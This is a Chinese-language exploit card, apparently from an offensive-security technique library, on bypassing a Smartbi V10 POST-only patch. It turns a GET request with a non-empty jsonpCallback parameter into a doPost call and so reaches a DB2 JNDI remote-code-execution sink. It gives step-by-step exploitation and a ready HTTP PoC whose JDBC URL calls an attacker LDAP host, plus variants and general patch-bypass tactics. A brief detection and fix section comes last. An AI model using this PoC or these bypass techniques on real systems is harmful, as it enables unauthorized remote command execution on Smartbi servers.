---
id: web-java-component-smartbi-rmiservlet-stub-jsonpcallback-get-post-bypass
title: Smartbi V10 *.stub + jsonpCallback：GET 转 POST 绕过仅拦 POST 的 DB2 RCE 补丁
type: scenario
domain: web
path: web/java/component
technique: smartbi-stub-jsonpcallback-get-post-bypass
aliases:
- Smartbi stub 绕过
- jsonpCallback 绕过
- '*.stub 命令执行'
- DB2 补丁绕过
- GET 转 POST 绕过
tags:
- smartbi
- java
- patch-bypass
- http-method
- jsonpcallback
- stub
- rmi-servlet
- db2
- rce
cve: []
severity: critical
confidence: medium
status: verified
affected_versions: Smartbi V10（原文：该问题应仅存在于 V10；V11 的 *.stub 由 StubServlet 统一处理且只支持 GET、不调用 Service）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V36
  verified_at: '2026-11-05T06:08:56+08:00'
  notes: 已对照原文与61张图核对：V10 web.xml 将 *.stub 映射 RMIServlet、早期补丁仅拒 POST、RMIServlet.doGet 在 jsonpCallback 非空时转调 doPost、后续禁用 jsonpCallback 修复，均与卡片一致。未验证点：原文未给出带 jsonpCallback 的完整执行请求，卡片 PoC 为按代码构造（已注明）；未本机复现，confidence=medium 合理。
---

## 一句话结论

Smartbi V10 把 `*.stub` 映射到 `RMIServlet`，而针对 stub 接口的早期补丁只拒绝了 POST 请求；`RMIServlet.doGet` 在 `jsonpCallback` 参数非空时会转调 `doPost`，攻击者因此可以用 GET + 非空 `jsonpCallback` 携带 DB2 JDBC 参数，绕过“仅拦 POST”的补丁，继续触发 `DataSourceService.testConnection` 的 JNDI RCE。

## 原理

- **同一 Servlet 的多个映射**：V10 的 `web.xml` 把 `*.stub` 与 `/vision/RMIServlet` 都映射到 `RMIServlet`，两条路径最终进入同一套 RMIInfo 解析与反射调用逻辑。
- **补丁只封了动词**：针对 stub 接口命令执行的补丁规则只拒绝 POST 请求，认为攻击者只能通过 POST 投递参数；它没有封住 GET 路径，也没有封住 Servlet 内部的转发能力。
- **doGet 的转发逻辑**：`RMIServlet.doGet` 读取 `jsonpCallback` 参数；若为空，返回 `Invalid URL`；若非空，则直接调用 `this.doPost(req, resp)`。于是 GET 请求可以摇身变为 POST 处理，进入正常的 RMI 方法调用流程。
- **结果**：GET 请求 `*.stub?className=DataSourceService&methodName=testConnection&params=...&jsonpCallback=x` 通过补丁检查后，仍会执行 `DataSourceService.testConnection`，DB2 JDBC URL 的 `clientRerouteServerListJNDIName` 触发 JNDI，最终 RCE。本质是“补丁封的是 HTTP 方法，而不是危险能力/参数”。
- 后续修复直接禁用 `jsonpCallback`，切断 GET→POST 的转发路径。

## 触发条件

- Smartbi V10（原文称该问题应仅存在于 V10；V11 的 `*.stub` 由 `smartbi.framework.rmi.StubServlet` 处理，只支持 GET 且不调用任何 Service）。
- `*.stub` 映射到 `RMIServlet`，且目标已打“仅拒绝 POST”的 stub 补丁但尚未禁用 `jsonpCallback`。
- `RMIServlet.doGet` 的 `jsonpCallback` 参数可被客户端控制且允许非空。
- 底层 `DataSourceService.testConnection` 的 DB2 JNDI sink 仍可用（见关联卡）。
- 攻击者拥有恶意的 LDAP/RMI 服务与 JNDI gadget。

## 利用步骤

1. 确认目标是 V10，且 `*.stub` 路径映射到 RMIServlet；任意 `.js.stub`/`.stub` 路径均可尝试。
2. 直接 POST `*.stub` 会被补丁拒绝；改为 GET，并加上非空 `jsonpCallback` 参数，使 `doGet` 转调 `doPost`。
3. 在 GET 查询参数中放入 `className=DataSourceService`、`methodName=testConnection`、`params=<数据源 JSON>`。
4. 数据源 JSON 与正常 DB2 JNDI 链一致：`driver=com.ibm.db2.jcc.DB2Driver`，`url` 含 `clientRerouteServerListJNDIName=ldap://attacker:50389/xxx;`，`validationQueryMethod=3`，补齐 `password` 等字段。
5. 观察恶意 LDAP/RMI 服务收到连接并触发命令执行。
6. 若目标已禁用 `jsonpCallback`，该路径失效，需寻找其它 GET/POST 转发或参数解析差异。

## PoC

```http
GET /smartbi/vision/xxxxx.js.stub?className=DataSourceService&methodName=testConnection&params={{urlesc([{"url":"jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=ldap://attacker:50389/4c94ba;","name":"test","driverType":"DB2","validationQuery":"select","driver":"com.ibm.db2.jcc.DB2Driver","maxConnection":"100","transactionIsolation":"1","validationQueryMethod":"3","authenticationType":"test","driverCatalog":"test","password":"x"}])}}&jsonpCallback=cb HTTP/1.1
Host: target
Cookie: JSESSIONID=<有效会话>
```

说明：原文展示的 PoC 片段未显式列出 `jsonpCallback`，但按其 `doGet` 逻辑，只有 `jsonpCallback` 非空才会进入 `doPost`；因此复现时应带上该参数。`params` 需按目标对 GET 参数的解析方式做 URL 编码（原文用 `{{urlesc(...)}}` 表示）。

## 变体与关联

- 变体（路径）：`*.stub` 可换成任意以 `.stub` 结尾的路径；也可以尝试 `/vision/RMIServlet` 的 GET + `jsonpCallback`，观察是否同样进入 `doPost`。
- 变体（参数编码）：`params` 可通过普通查询参数、`encode` 编码参数或 multipart 表单传入；不同入口的解析优先级不同。
- 变体（补丁绕过思路）：同类“只拦 POST/只拦某路径/只拦某关键字”的补丁，都可用 HTTP 方法切换、Servlet 内部转发、参数位置变化绕过。
- 关联：[[web-java-component-smartbi-rmiservlet-db2-jdbc-jndi-rce]]（本卡绕过后投递的 DB2 JNDI sink 与完整数据源参数）。
- 关联：[[web-java-component-smartbi-v10-windowunloading-auth-parse-split-bypass]]（另一条 V10 RMIServlet 参数解析不一致的绕过）。
- 边界：V11 的 `*.stub` 由 `StubServlet` 处理且不调用 Service，本卡不适用；目标禁用 `jsonpCallback` 后失效。

## 检测与防御

- 修复：禁用 `jsonpCallback` 或限制其只用于受控的 JSONP 场景；`*.stub` 使用独立 Servlet，不映射到通用 RMIServlet。
- 补丁原则：按“危险能力/参数”封堵，而不是只按 HTTP 方法或单一 URL 前缀封堵；对 GET、POST、multipart、encode 等所有参数入口统一校验。
- 鉴权：`*.stub` 与 `/vision/RMIServlet` 使用同一套强鉴权与 Service 方法白名单。
- 检测：GET 请求访问 `*.stub` 且带 `jsonpCallback`、`className`、`methodName`、`params`；同一 IP 在 POST 被拒后改用 GET；请求中出现 `clientRerouteServerListJNDIName` 或 `ldap://`/`rmi://`；Smartbi 进程异常外连 LDAP/RMI。
